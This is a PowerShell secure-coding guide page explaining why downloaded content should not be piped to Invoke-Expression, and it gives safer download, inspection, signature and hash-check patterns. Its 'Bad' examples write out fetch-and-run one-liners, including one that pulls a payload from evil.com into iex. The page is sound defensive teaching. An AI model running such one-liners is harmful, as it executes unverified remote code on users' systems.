# sec-avoid-download-pipe-iex

> Never pipe downloaded content to Invoke-Expression

## Why It Matters

The pattern `Invoke-WebRequest $url | Invoke-Expression` (or `iex (iwr $url)`) runs arbitrary remote code without any inspection or signature verification. This is the PowerShell equivalent of `curl | bash` and is the most common vector for malware delivery via PowerShell. Never run code you haven't inspected.

## Bad

```powershell
# Extremely dangerous — runs anything from URL
iex (New-Object Net.WebClient).DownloadString('https://evil.com/payload.ps1')
Invoke-WebRequest https://example.com/install.ps1 | Invoke-Expression
iwr https://get.example.com/tool | iex  # Short form, same danger

# Even "trusted" URLs can be compromised
Invoke-RestMethod https://raw.githubusercontent.com/user/repo/main/install.ps1 |
    Invoke-Expression
```

## Good

```powershell
# Step 1: Download to disk
$scriptPath = Join-Path $env:TEMP "install-$(Get-Date -Format yyyyMMdd).ps1"
Invoke-WebRequest https://trusted.example.com/install.ps1 -OutFile $scriptPath

# Step 2: Inspect the content
Get-Content $scriptPath | Select-Object -First 50
Write-Host "Script downloaded to: $scriptPath"

# Step 3: Verify signature if expected
$sig = Get-AuthenticodeSignature $scriptPath
if ($sig.SignerCertificate) {
    Write-Host "Signed by: $($sig.SignerCertificate.Subject)"
}

# Step 4: Confirm with user
$confirm = Read-Host "Review and run? [y/N]"
if ($confirm -eq 'y') {
    & $scriptPath
}
```

## Supply Chain Safety

```powershell
# Prefer PSGallery with verified publishers
Find-PSResource -Name 'MyModule' -Repository 'PSGallery' |
    Where-Object { $_.Publisher -eq 'Trusted Corp' }

Install-PSResource -Name 'MyModule' -TrustedRepository

# Verify module integrity after install
$module = Get-Module -Name 'MyModule' -ListAvailable
Get-AuthenticodeSignature $module.Path

# Pin versions and verify hashes in CI
$expectedHash = 'A1B2C3...'
$actualHash = (Get-FileHash .\vendor\module.psm1 -Algorithm SHA256).Hash
if ($actualHash -ne $expectedHash) {
    throw 'Module hash mismatch!'
}
```

## See Also

- [sec-avoid-iex](sec-avoid-iex.md) - Invoke-Expression danger
- [sec-script-signing](sec-script-signing.md) - Script signing
